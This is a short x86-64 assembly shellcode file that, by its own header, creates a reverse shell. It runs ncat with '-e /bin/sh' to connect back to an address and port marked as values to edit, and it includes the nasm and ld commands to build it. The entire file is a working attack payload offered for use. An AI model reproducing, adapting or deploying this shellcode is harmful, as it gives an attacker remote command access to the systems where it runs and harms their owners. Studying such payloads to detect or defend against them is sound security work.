
;
; Author: BITAM Salim (github.com/soolidsnake)
; Lenght: 114 bytes
; Purpose: creates a reverse shell with ncat
;
; nasm -f elf64 reverse_nc_shell.asm; ld -m elf_x86_64 -s -o reverse_nc_shell reverse_nc_shell.o
;

section .text
  global _start

_start:

	xor rdx, rdx

	mov rax, '/bin/sh'
	push rax
	mov r8, rsp

	mov rax, '-e'
	push rax
	mov r9, rsp

	mov rax, '000.001'
	push rax
	mov rax, '127.000.'; ip address to connect to
	push rax
	mov r10, rsp

	mov rax, '12345'; port to connect to
	push rax
	mov r11, rsp

	push rdx

	push r11; argv[4]
	push r10; argv[3]
	push r8;  argv[2]
	push r9;  argv[1]
	push r8;  argv[0]

	mov rsi, rsp
	xor rdx, rdx
	mov rax, '/ncat'
	push rax
	mov rax, '/usr/bin'; path to ncat
	push rax
	xchg rdi, rsp
	mov rax, 59
	syscall; execve